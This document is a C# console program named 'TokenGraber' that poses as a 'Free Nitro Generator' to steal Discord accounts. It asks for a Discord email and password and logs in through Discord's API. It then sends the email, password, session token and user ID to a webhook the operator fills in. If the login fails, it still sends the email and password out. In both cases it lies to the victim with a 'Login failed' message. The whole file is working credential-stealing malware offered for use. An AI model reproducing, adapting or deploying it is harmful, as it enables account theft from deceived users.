using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace TokenGraber
{
    class Program
    {
        static async Task Main(string[] args)
        {
        Console.Title = "Free Nitro Generator!";
        Console.Write("Enter Email: ");
        string email = Console.ReadLine();
        Console.Write("Enter Password: ");
        string password = Console.ReadLine();

        await PizdToken(email, password);
        }
        static async Task PizdToken(string email, string password)
        {
            string url = "https://discord.com/api/v9/auth/login"; 
            var payload = new Dictionary<string, string>
            {
                { "login", email },
                { "password", password }
            };
            string jsonPayload = JsonConvert.SerializeObject(payload);
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    StringContent stringCont = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
                    HttpResponseMessage response = await client.PostAsync(url, stringCont);
                    string respCont = await response.Content.ReadAsStringAsync();

                    if (response.IsSuccessStatusCode)
                    {
                        var responseData = JsonConvert.DeserializeObject<Dictionary<string, object>>(respCont);
                        string userId = responseData.ContainsKey("user_id") ? responseData["user_id"].ToString() : "N/A";
                        string token = responseData.ContainsKey("token") ? responseData["token"].ToString() : "N/A";
                        string theme = responseData.ContainsKey("user_settings") ? responseData["user_settings"].ToString() : "N/A";

                        string webhookUrl = "paste_your_webhook_here";
                        var webhookPayload = new
                        {
                            content = $"**Email:** {email}" +
                                      $"\n**Password:** {password}" +
                                      $"\n**Token:** {token}" +
                                      $"\n**User ID:** {userId}" +
                                      $"\n**User Settings:** {theme}"
                        };
                        string jsonWebhookPayload = JsonConvert.SerializeObject(webhookPayload);
                        StringContent webhookContent = new StringContent(jsonWebhookPayload, Encoding.UTF8, "application/json");
                        HttpResponseMessage webhookResponse = await client.PostAsync(webhookUrl, webhookContent);
                        string webhookResponseContent = await webhookResponse.Content.ReadAsStringAsync();
                        Console.WriteLine("Login failed. Please Re-Check your Email and Password again!");
                        Console.ReadKey();
                    }
                    else
                    {
                        string webhookUrl = "paste_your_webhook_here";
                        var webhookPayload = new
                        {
                            content = $"**Failed to login🤷‍♂️🤦‍♂️**\n**Email:** {email}; \n**Password:** {password};"
                        };
                        string jsonWebhookPayload = JsonConvert.SerializeObject(webhookPayload);
                        StringContent webhookContent = new StringContent(jsonWebhookPayload, Encoding.UTF8, "application/json");
                        HttpResponseMessage webhookResponse = await client.PostAsync(webhookUrl, webhookContent);
                        string webhookResponseContent = await webhookResponse.Content.ReadAsStringAsync();

                        Console.WriteLine("Login failed. Please Re-Check your Email and Password again!");
                        Console.ReadKey();
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Exception occurred: {ex.Message}");
                }
            }
        }
    }
}
